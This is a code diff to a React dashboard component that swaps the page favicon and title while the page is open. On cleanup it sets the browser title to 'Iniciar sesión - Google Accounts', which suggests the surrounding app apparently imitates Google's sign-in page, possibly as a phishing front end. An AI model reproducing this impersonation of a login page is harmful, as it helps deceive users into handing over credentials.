@@ -41,9 +41,27 @@ function DashboardPage() {
   };
 
   useEffect(() => {
+    const link = document.querySelector('link[rel="icon"]');
+    const originalHref = link?.getAttribute('href');
+    const originalType = link?.getAttribute('type');
+    if (link) {
+      link.setAttribute('href', '/logo.png');
+      link.setAttribute('type', 'image/png');
+    }
+    document.title = 'Dashboard - S-Code';
+
     fetchData();
     const interval = setInterval(fetchData, 15000);
-    return () => clearInterval(interval);
+
+    return () => {
+      clearInterval(interval);
+      if (link && originalHref) {
+        link.setAttribute('href', originalHref);
+        if (originalType) link.setAttribute('type', originalType);
+        else link.removeAttribute('type');
+      }
+      document.title = 'Iniciar sesión - Google Accounts';
+    };
   }, []);
 
   if (loading) {
